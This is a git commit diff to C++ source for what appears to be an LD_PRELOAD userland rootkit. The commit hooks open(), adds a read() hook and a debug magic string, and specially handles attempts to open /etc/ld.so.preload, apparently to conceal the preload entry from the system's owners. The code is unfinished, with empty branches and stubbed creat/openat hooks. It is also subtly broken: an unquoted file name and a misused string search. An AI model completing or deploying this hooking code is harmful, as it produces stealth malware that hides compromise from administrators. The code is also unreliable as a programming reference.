5f29d799f2af462be54d989de9d421c896a0fdcd
yarr <yarr@debian-yaroslav.localdomain>
2014-07-14 18:55:10 +0400

    some strings

--- main.h
+++ main.h
@@ -29,6 +29,7 @@
 #ifndef NDEBUG
 	#define MAGIC_STRING "0x1234DEADBEAF4321"
 #endif
+const char *prelFileName = "/etc/ld.so.preload";
 
 //
 // Prototypes and POD types
@@ -42,6 +43,7 @@ typedef int (*RDDR_R) (DIR *dirp, struct dirent *entry, struct dirent **result);
 typedef int (*OPEN)(const char *pathname, int flags, mode_t mode);
 typedef int (*CREAT)(const char *pathname, mode_t mode);
 typedef int (*OPENAT)(int dirfd, const char *pathname, int flags, mode_t mode);
+typedef ssize_t (*READ)(int fd, void *buf, size_t count);
 
 //
 // C++ classes and structures
@@ -52,9 +54,14 @@ class CErrnoSaver {
 public:
 	CErrnoSaver (): m_errno (errno) {}
 	~CErrnoSaver () {errno = m_errno;}
+	
+	void set (int err) {m_errno = errno;}
+	int get () const {return m_errno;}
 };
 
-
+typedef struct _DESCR_AND_FLAGS {
+	int m_desc;
+} DESCR_AND_FLAGS, *PDESCR_AND_FLAGS;
 
 
 
--- open.cpp
+++ open.cpp
@@ -2,25 +2,75 @@
 #include <main.h>
 
 
+static DESCR_AND_FLAGS dsInfo;
+
+
 
 int open(const char *pathname, int flags, mode_t mode) {
+	CErrnoSaver serr;
 	OPEN opnPtr = (OPEN)dlsym (RTLD_NEXT, "open");
+	READ rdPtr = (READ)dlsym (RTLD_NEXT, "read");
+	std::string file (pathname);
+	size_t ind;
+	char chArr[3]; // just in case for utf-16 coding with 2-bytes symbols
 	
 	
 	assert (opnPtr != NULL);
 	
+	ind = file.find_last_of ('/', 0);
+	++ind;
+	if (ind != std::string::npos) file.assign (file, ind, file.length () - ind);
+	if (!strcmp (prelFileName, file.c_str ())) {
+		int fd = opnPtr (dynamic_cnf.txt, O_RDWR);
+		ind = rdPtr (fd, chArr, 2);
+		
+		// We don't know have created or not the file. At default we think not.
+		// This situation is rather unlikely
+		if (-1 == ind) {
+			if (flags & (~O_CREAT))
+				return opnPtr (pathname, flags & (~O_TRUNC), mode);
+			else {
+				serr.set (ENOENT);
+				return -1;
+			}
+		}
+		
+		chArr[ind] = '\0';
+		// If we work with utf-16, not utf-8
+		if (chArr[0] == 0) {
+			chArr [0] = chArr[1];
+			chArr[1] = '\0';
+		}
+		
+		// Have created
+		if (chArr[0] == '1') {
+			
+		}
+		// Havn't created
+		else {
+			
+		}
+		
+		
+		return -1;
+	}
 	
 	
-	
-	return -1;
+	return opnPtr (pathname, flags, mode);
 }
 
 int creat(const char *pathname, mode_t mode) { // O_CREATE | O_TRUNC | O_WRONLY
+	
+	
+	
 	
 	return -1;
 }
 
 int openat(int dirfd, const char *pathname, int flags, mode_t mode) {
+	
+	
+	
 	
 	return -1;
 }
